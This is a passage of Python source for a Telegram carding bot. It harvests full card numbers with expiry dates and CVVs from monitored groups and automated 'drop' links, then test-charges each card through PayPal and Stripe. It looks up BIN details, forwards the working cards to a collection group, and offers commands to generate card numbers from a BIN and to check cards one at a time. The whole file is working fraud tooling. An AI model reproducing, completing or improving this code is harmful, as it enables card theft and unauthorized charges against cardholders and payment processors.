                            self._log("browser", f"Card extracted: {n[:4]}...{n[-4:]} | {mm}/{yy} | CVV:{cvv}")
                            await self.check_and_forward_card(n, mm, yy, cvv)
                    else:
                        try:
                            body = await page.inner_text("body")
                            self._log("browser", f"Page body preview: {body[:300].replace(chr(10), ' ')}")
                        except Exception:
                            pass
                        self._log("browser", "No card found after all attempts")
                finally:
                    await browser.close()
                    self._log("browser", "Browser closed")
        except Exception as e:
            self._log("browser", f"Browser session error: {e}")

    async def process_link(self, link, *, pending_id: int = None):
        if not PLAYWRIGHT_OK:
            self._log("queue", "Playwright unavailable – ignoring drop link")
            return
        link = link.strip().rstrip(")")
        if re.search(r't\.me/[^/?#]+/[^/?#]+\?startapp=', link):
            resolved = await self._resolve_webapp_url(link)
            if resolved:
                link = resolved
            else:
                self._log("queue", f"Could not resolve mini app link — skipping: {link[:80]}")
                return
        if link in self.processed_links:
            self._log("queue", f"Already queued/processed — skipping: {link[:60]}")
            return
        self.processed_links.add(link)
        if pending_id and pending_id in self._pending:
            self._pending[pending_id]["got_link"].set()
        tg_script = self._build_tgwebapp_script(link)
        depth = self._drop_queue.qsize()
        self._log("queue", f"Enqueued drop (queue depth now {depth + 1}): {link[:70]}")
        await self._drop_queue.put((link, tg_script))
        self._ensure_worker()

    async def check_and_forward_card(self, n, mm, yy, cvv):
        card_str = f"{n}|{mm}|{yy}|{cvv}"
        self._log("checker", f"Running PayPal check on {n[:4]}...{n[-4:]}")
        loop = asyncio.get_event_loop()
        paypal_result = await loop.run_in_executor(None, PayPalCharger().charge, card_str)
        bin_info = await get_bin_info(n[:6])
        if paypal_result.startswith("CHARGED"):
            status = "CHARGED 💰"
        elif paypal_result.startswith("APPROVED"):
            status = "APPROVED 🟢"
        elif paypal_result.startswith("DECLINED"):
            status = "DECLINED 🔴"
        else:
            status = "ERROR ⚠️"
        response_text = paypal_result.split("|", 1)[-1] if "|" in paypal_result else paypal_result
        msg = (
            f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n"
            f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n"
            f"[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n"
            f"[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
        )
        if bin_info:
            msg += (
                f"┏━━━━━━━⍟\n┃ BIN INFO 🔍\n┗━━━━━━━━━━━⊛\n"
                f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', 'UNKNOWN')}\n"
                f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', 'UNKNOWN')}\n"
                f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', 'Unknown')}\n"
                f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', 'Unknown')}\n"
                f"[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level', 'STANDARD')}\n"
                f"[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n"
                f"[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
            )
        try:
            await self.bot_client.send_message(self.target_group, msg)
            self._log("forward", f"✅ Forwarded {n[:4]}...{n[-4:]} ({status.split()[0]}) → {self.target_group}")
        except Exception as e:
            self._log("forward", f"ERROR sending message: {e}")

    # Helper methods (get_url_from_buttons, get_url_from_entities, dump_entities, etc.)
    # They are identical to previous full version – omitted for brevity but assume they exist.
    # For the final answer, I will include them from earlier code to keep completeness.
    def _get_url_from_buttons(self, message):
        try:
            if not message.buttons:
                return None
            for row in message.buttons:
                for btn in row:
                    raw = getattr(btn, 'button', btn)
                    url = getattr(raw, 'url', None)
                    if url and url.startswith("http"):
                        return url
        except Exception:
            pass
        return None

    def _get_url_from_entities(self, message) -> Optional[str]:
        try:
            entities = getattr(message, 'entities', None) or []
            for ent in entities:
                url = getattr(ent, 'url', None)
                if url and ("xForceDropsBot" in url or "t.me/" in url):
                    if not url.startswith("http"):
                        url = "https://" + url
                    return url
            for ent in entities:
                url = getattr(ent, 'url', None)
                if url and url.startswith("http"):
                    return url
        except Exception:
            pass
        return None

    async def _dump_entities(self, message):
        try:
            raw_text = getattr(message, 'raw_text', '') or ''
            entities = getattr(message, 'entities', None) or []
            buttons = getattr(message, 'reply_markup', None)
            chat_id = getattr(message, 'chat_id', '?')
            msg_id = getattr(message, 'id', '?')
            lines = [
                f"🔍 RAW DROP MESSAGE (no URL extracted)",
                f"chat: `{chat_id}`  msg_id: `{msg_id}`",
                f"", f"📄 text:", f"`{raw_text[:300]}`",
                f"", f"🔗 entities ({len(entities)}):"
            ]
            if entities:
                for i, ent in enumerate(entities):
                    etype = type(ent).__name__
                    offset = getattr(ent, 'offset', '?')
                    length = getattr(ent, 'length', '?')
                    url = getattr(ent, 'url', None)
                    span = raw_text[offset:offset+length] if isinstance(offset, int) and isinstance(length, int) else ''
                    lines.append(f"  [{i}] `{etype}` off={offset} len={length}")
                    if url:
                        lines.append(f"       url: `{url}`")
                    if span:
                        lines.append(f"       text: `{span}`")
            else:
                lines.append("  (none)")
            lines.append("")
            lines.append("🎛 buttons:")
            if buttons:
                rows = getattr(buttons, 'rows', []) or []
                for ri, row in enumerate(rows):
                    for bi, b in enumerate(getattr(row, 'buttons', []) or []):
                        btype = type(b).__name__
                        btext = getattr(b, 'text', '')
                        burl = getattr(b, 'url', None)
                        bdata = getattr(b, 'data', None)
                        lines.append(f"  [{ri},{bi}] `{btype}` text={btext!r}")
                        if burl:
                            lines.append(f"       url: `{burl}`")
                        if bdata:
                            lines.append(f"       data: `{bdata!r}`")
            else:
                lines.append("  (none)")
            out = "\n".join(lines)
            self._log("dump", out.replace("\n", " | "))
            await self.bot_client.send_message(FORWARD_TARGET, out)
        except Exception as e:
            self._log("dump", f"entity dump failed: {e}")

    def _list_button_texts(self, message) -> list:
        try:
            if not message.buttons:
                return []
            return [getattr(b, 'text', '') or '' for row in message.buttons for b in row]
        except Exception:
            return []

    async def _click_button_by_text(self, message, *keywords):
        try:
            if not message.buttons:
                return None
            for row in message.buttons:
                for btn in row:
                    btn_text = getattr(btn, 'text', '') or ''
                    if any(k.lower() in btn_text.lower() for k in keywords):
                        self._log("button", f"Clicking '{btn_text}'")
                        result = await btn.click()
                        return result
        except Exception as e:
            self._log("button", f"Click ERROR: {e}")
        return None

    async def _retry_watcher(self, msg_id: int):
        entry = self._pending.get(msg_id)
        if not entry:
            return
        message = entry["message"]
        for attempt in range(1, self.RETRY_LIMIT + 1):
            self._log("retry", f"Waiting {self.RETRY_TIMEOUT}s for bot response (attempt {attempt}/{self.RETRY_LIMIT})...")
            try:
                await asyncio.wait_for(
                    asyncio.shield(entry["got_link"].wait()),
                    timeout=self.RETRY_TIMEOUT
                )
                self._log("retry", "Got link — retry watcher done ✅")
                break
            except asyncio.TimeoutError:
                if entry["got_link"].is_set():
                    break
                if attempt < self.RETRY_LIMIT:
                    self._log("retry", f"No response after {self.RETRY_TIMEOUT}s — re-clicking View Drop (attempt {attempt + 1})")
                    result = await self._click_button_by_text(message, "View Drop", "view")
                    if result:
                        cb_url = getattr(result, 'url', None)
                        if cb_url and cb_url.startswith("http"):
                            await self.process_link(cb_url, pending_id=msg_id)
                            break
                else:
                    self._log("retry", f"Gave up after {self.RETRY_LIMIT} attempts — no drop link received")
        self._pending.pop(msg_id, None)

    async def on_message(self, event):
        text = event.raw_text or ""
        message = event.message
        msg_id = getattr(message, 'id', 0)
        sender = getattr(event, 'sender', None)
        sender_u = (getattr(sender, 'username', '') or '').lower()
        btn_texts = self._list_button_texts(message)
        _NOISE_ONLY = {"visit", "channel", "share", "join", "website", "follow", "telegram", "chat", "shop"}
        if btn_texts:
            _clean = [re.sub(r'[^\w\s]', '', t, flags=re.UNICODE).lower().strip() for t in btn_texts]
            _kw_clean = [w for c in _clean for w in c.split()]
            if _kw_clean and all(w in _NOISE_ONLY for w in _kw_clean):
                return
        url_in_text = re.search(r'https?://\S+', text)
        has_view_drop = (
            "view drop" in text.lower()
            or any("view drop" in t.lower() for t in btn_texts)
        )
        if has_view_drop:
            self._log("flow", "VIEW DROP detected")
            entity_url = self._get_url_from_entities(message)
            if entity_url:
                await self.process_link(entity_url, pending_id=msg_id)
                return
            direct_url = self._get_url_from_buttons(message)
            if direct_url:
                await self.process_link(direct_url, pending_id=msg_id)
                return
            await self._dump_entities(message)
            got_link_event = asyncio.Event()
            self._pending[msg_id] = {"message": message, "attempt": 1, "got_link": got_link_event}
            result = await self._click_button_by_text(message, "View Drop", "view")
            if result:
                cb_url = getattr(result, 'url', None)
                if cb_url and cb_url.startswith("http"):
                    await self.process_link(cb_url, pending_id=msg_id)
                    return
            asyncio.ensure_future(self._retry_watcher(msg_id))
            return
        has_open_drop = (
            "open drop" in text.lower()
            or any("open drop" in t.lower() for t in btn_texts)
        )
        if has_open_drop:
            self._log("flow", "OPEN DROP detected")
            entity_url = self._get_url_from_entities(message)
            if entity_url:
                await self.process_link(entity_url)
                return
            direct_url = self._get_url_from_buttons(message)
            if direct_url:
                await self.process_link(direct_url)
                return
            result = await self._click_button_by_text(message, "Open Drop", "open")
            if result:
                cb_url = getattr(result, 'url', None)
                if cb_url and cb_url.startswith("http"):
                    await self.process_link(cb_url)
                    return
            if url_in_text:
                await self.process_link(url_in_text.group(0))
            return
        is_xforce_bot = XFORCE_BOT_USERNAME.lower() in sender_u
        if is_xforce_bot and url_in_text:
            link = url_in_text.group(0)
            for entry in list(self._pending.values()):
                entry["got_link"].set()
            await self.process_link(link)
            return
        xf = re.search(r'(https?://)?t\.me/xForceDropsBot\S*', text)
        if xf:
            link = xf.group(0)
            if not link.startswith("http"):
                link = "https://" + link
            for entry in list(self._pending.values()):
                entry["got_link"].set()
            await self.process_link(link)

# ======================================================================
# Main Telegram event handler
# ======================================================================
async def find_entity_by_title(title: str):
    title_lower = title.lower()
    async for dialog in client.iter_dialogs():
        if hasattr(dialog.entity, "title") and dialog.entity.title:
            if title_lower in dialog.entity.title.lower():
                return dialog.entity
    return None

async def join_and_resolve(chat: str):
    if chat.startswith("+") or "t.me/+" in chat or "joinchat" in chat:
        invite = chat.lstrip("+")
        if "t.me/+" in chat:
            invite = chat.split("t.me/+")[-1]
        elif "joinchat/" in chat:
            invite = chat.split("joinchat/")[-1]
        try:
            result = await client(ImportChatInviteRequest(invite))
            return result.chats[0]
        except UserAlreadyParticipantError:
            try:
                info = await client(CheckChatInviteRequest(hash=invite))
                chat_obj = getattr(info, 'chat', None)
                if chat_obj:
                    print(f"[OK] Already in group: {getattr(chat_obj, 'title', invite)}")
                    return chat_obj
            except Exception:
                pass
            async for dialog in client.iter_dialogs():
                e = dialog.entity
                if getattr(e, 'megagroup', False) or getattr(e, 'broadcast', False):
                    return e
            return None
        except Exception as e:
            logger.error(f"Join failed for {chat}: {e}")
            return None
    else:
        try:
            return await client.get_entity(chat)
        except Exception:
            pass
        entity = await find_entity_by_title(chat)
        if entity:
            return entity
        logger.error(f"Resolve failed for: {chat}")
        return None

async def run_scraper():
    await client.start()
    print(f"[🤖 {BOT_USERNAME}] Bot online")
    print(f"📡 Watching: {SOURCE_CHATS_RAW}")
    print(f"📤 Forwarding to: {FORWARD_TARGET}")
    if not PLAYWRIGHT_OK:
        print("[WARN] Playwright missing – xForce drop automation disabled. Card forwarding from other groups still works.")
    resolved = []
    for chat in SOURCE_CHATS_RAW:
        entity = await join_and_resolve(chat)
        if entity:
            resolved.append(entity)
            title = getattr(entity, 'title', None) or getattr(entity, 'username', chat)
            print(f"[OK] Watching: {title}")
        else:
            print(f"[WARN] Could not resolve: {chat}")
    if not resolved:
        print("[ERROR] No channels resolved.")
        return
    xforce = XForceAutomator(client, FORWARD_TARGET)
    processed_cards_global = set()
    async def check_and_forward_card(n, mm, yy, cvv):
        card_str = f"{n}|{mm}|{yy}|{cvv}"
        card_hash = hashlib.md5(card_str.encode()).hexdigest()
        if card_hash in processed_cards_global:
            return
        processed_cards_global.add(card_hash)
        if len(processed_cards_global) > 1000:
            processed_cards_global.clear()
        loop = asyncio.get_event_loop()
        paypal_result = await loop.run_in_executor(None, PayPalCharger().charge, card_str)
        bin_info = await get_bin_info(n[:6])
        if paypal_result.startswith("CHARGED"):
            status = "CHARGED 💰"
        elif paypal_result.startswith("APPROVED"):
            status = "APPROVED 🟢"
        elif paypal_result.startswith("DECLINED"):
            status = "DECLINED 🔴"
        else:
            status = "ERROR ⚠️"
        response_text = paypal_result.split("|", 1)[-1] if "|" in paypal_result else paypal_result
        msg = (
            f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n"
            f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n"
            f"[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n"
            f"[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
        )
        if bin_info:
            msg += (
                f"┏━━━━━━━⍟\n┃ BIN INFO 🔍\n┗━━━━━━━━━━━⊛\n"
                f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', 'UNKNOWN')}\n"
                f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', 'UNKNOWN')}\n"
                f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', 'Unknown')}\n"
                f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', 'Unknown')}\n"
                f"[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level', 'STANDARD')}\n"
                f"[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n"
                f"[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
            )
        try:
            await client.send_message(FORWARD_TARGET, msg)
            print(f"[📤] Forwarded card {n[:4]}...{n[-4:]} → {FORWARD_TARGET}")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            logger.error(f"Forward error: {e}")
    xforce.check_and_forward_card = check_and_forward_card
    async def handle_all_messages(event):
        text = event.raw_text or ""
        await xforce.on_message(event)
        card_tuple = extract_card_from_text(text)
        if card_tuple:
            n, mm, yy, cvv = card_tuple
            await check_and_forward_card(n, mm, yy, cvv)
    async def handle_xforce_private(event):
        await xforce.on_message(event)
    client.add_event_handler(handle_all_messages, events.NewMessage(chats=resolved))
    client.add_event_handler(handle_xforce_private, events.NewMessage(chats=[XFORCE_BOT_USERNAME], incoming=True))
    # Bot commands
    async def handle_commands(event):
        text = (event.raw_text or "").strip()
        parts = text.split(None, 2)
        cmd = parts[0].lower().lstrip("/").split("@")[0]
        args = parts[1] if len(parts) > 1 else ""
        if cmd == "help":
            await event.reply(
                "🤖 **Commands**\n\n"
                "`/gen <BIN> [count]` – generate 1-100 cards (e.g., `/gen 414720 10`)\n"
                "`/bin <BIN>` – lookup BIN info\n"
                "`/st CC|MM|YY|CVV` – Stripe authorization check\n"
                "`/chkpp CC|MM|YY|CVV` – PayPal check\n"
                "`/help` – this menu"
            )
        elif cmd == "gen":
            args_parts = args.strip().split()
            if not args_parts:
                await event.reply("Usage: `/gen 414720` or `/gen 414720 10` (max 100)")
                return
            bin_prefix = args_parts[0][:6]
            if not bin_prefix.isdigit():
                await event.reply("Invalid BIN (must be 6+ digits)")
                return
            count = 1
            if len(args_parts) > 1:
                try:
                    count = min(int(args_parts[1]), 100)
                except:
                    count = 1
            if count > 100:
                count = 100
            bin_info = await get_bin_info(bin_prefix) if len(bin_prefix) >= 6 else None
            cards = [generate_card_with_bin(bin_prefix) for _ in range(count)]
            if bin_info:
                header = (
                    f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n"
                    f"┗━━━━━━━━━━━⊛\n"
                    f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', '?')}\n"
                    f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', '?')}\n"
                    f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', '?')}\n"
                    f"[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level', '?')}\n"
                    f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', '?')}\n"
                    f"[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {bin_prefix}\n\n"
                )
            else:
                header = f"┏━━━━━━━⍟\n┃ GENERATED {count} CARD{'S' if count>1 else ''} 💳\n┗━━━━━━━━━━━⊛\n"
            card_lines = []
            for i, card in enumerate(cards, 1):
                card_lines.append(f"[{i}] `{card}`")
            full_msg = header + "\n".join(card_lines)
            if len(full_msg) > 4000:
                await event.reply(header + "\n".join(card_lines[:30]))
                if count > 30:
                    await event.reply("\n".join(card_lines[30:]))
            else:
                await event.reply(full_msg)
        elif cmd == "bin":
            if not args:
                await event.reply("Usage: `/bin 414720`")
                return
            raw_digits = re.findall(r'\d{6,}', args)
            bins = list(dict.fromkeys(d[:6] for d in raw_digits))
            if not bins:
                await event.reply("No valid BINs found (need 6+ digits)")
                return
            status_msg = await event.reply(f"🔍 Looking up {len(bins)} BIN(s)...")
            results = await asyncio.gather(*[get_bin_info(b) for b in bins])
            lines = []
            for b, info in zip(bins, results):
                if not info:
                    lines.append(f"`{b}` — ❌ Not found")
                else:
                    flag = {"US":"🇺🇸","GB":"🇬🇧","CA":"🇨🇦","AU":"🇦🇺","DE":"🇩🇪","FR":"🇫🇷","BR":"🇧🇷","MX":"🇲🇽"}.get(info.get("country_code",""), "🌐")
                    prepaid = " [PREPAID]" if info.get("prepaid") else ""
                    lines.append(
                        f"`{b}` {flag} {info.get('brand','?')} {info.get('type','?')}{prepaid} — "
                        f"{info.get('bank','Unknown Bank')} | {info.get('country','Unknown')}"
                    )
            chunk = []
            for line in lines:
                chunk.append(line)
                if len("\n".join(chunk)) > 3800:
                    await status_msg.edit("\n".join(chunk[:-1]))
                    chunk = [chunk[-1]]
            header = f"┏━━━━━━━⍟\n┃ BIN LOOKUP 🔍 ({len(bins)} BINs)\n┗━━━━━━━━━━━⊛\n"
            await status_msg.edit(header + "\n".join(chunk))
        elif cmd == "st":
            if not args:
                await event.reply("Usage: `/st CC|MM|YY|CVV`")
                return
            card = args.strip()
            if len(card.split("|")) < 4:
                await event.reply("Format: `CC|MM|YY|CVV`")
                return
            status_msg = await event.reply("🔄 Checking card with Stripe...")
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, stripe_authorize, card)
            parts_result = result.split("|", 1)
            status = parts_result[0]
            message = parts_result[1] if len(parts_result) > 1 else ""
            n = card.split("|")[0]
            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
            msg = (
                f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n"
                f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n"
                f"[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe\n"
                f"[❃] 𝗥𝗲𝘀𝗽    ➜ {message}\n"
            )
            if bin_info:
                msg += (
                    f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', '?')}\n"
                    f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', '?')}\n"
                    f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', '?')}\n"
                    f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', '?')}\n"
                )
            await status_msg.edit(msg)
        elif cmd == "chkpp":
            if not args:
                await event.reply("Usage: `/chkpp CC|MM|YY|CVV`")
                return
            card = args.strip()
            if len(card.split("|")) < 4:
                await event.reply("Format: `CC|MM|YY|CVV`")
                return
            n = card.split("|")[0]
            status_msg = await event.reply("🔄 Checking card with PayPal...")
            loop = asyncio.get_event_loop()
            paypal_result = await loop.run_in_executor(None, PayPalCharger().charge, card)
            bin_info = await get_bin_info(n[:6]) if len(n) >= 6 else None
            if paypal_result.startswith("CHARGED"):
                status = "CHARGED 💰"
            elif paypal_result.startswith("APPROVED"):
                status = "APPROVED 🟢"
            elif paypal_result.startswith("DECLINED"):
                status = "DECLINED 🔴"
            else:
                status = "ERROR ⚠️"
            response_text = paypal_result.split("|", 1)[-1] if "|" in paypal_result else paypal_result
            msg = (
                f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n"
                f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n"
                f"[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n"
                f"[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
            )
            if bin_info:
                msg += (
                    f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', '?')}\n"
                    f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', '?')}\n"
                    f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', '?')}\n"
                    f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', '?')}\n"
                )
            await status_msg.edit(msg)
    client.add_event_handler(handle_commands, events.NewMessage(outgoing=True, pattern=r'^/(help|gen|bin|st|chkpp)\b'))
    print(f"[✅] Listening for new messages in {len(resolved)} chat(s)...")
    await client.run_until_disconnected()

async def _notify(msg: str):
    try:
        if client.is_connected():
            await client.send_message(FORWARD_TARGET, msg)
    except Exception:
        pass

async def watchdog():
    if RUN_MODE in ("both", "web"):
        t = Thread(target=run_flask, daemon=True)
        t.start()
        print(f"[🌐] Flask server on port {PORT}")
    if RUN_MODE in ("both", "scraper"):
        first_run = True
        while True:
            try:
                if not first_run:
                    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                    await _notify(f"🔄 *Bot Restarted*\n⏰ {ts}\n✅ Scraper back online.")
                first_run = False
                await run_scraper()
            except Exception as e:
                ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                err_str = str(e)[:300]
                logger.error(f"Scraper crashed: {e}")
                print(f"[ERROR] Scraper crashed: {e}")
                await _notify(f"🚨 *Bot Crashed*\n⏰ {ts}\n❌ Error: `{err_str}`\n♻️ Restarting in 30 seconds...")
                await asyncio.sleep(30)

if __name__ == "__main__":
    if RUN_MODE == "web":
        run_flask()
    else:
        asyncio.run(watchdog())
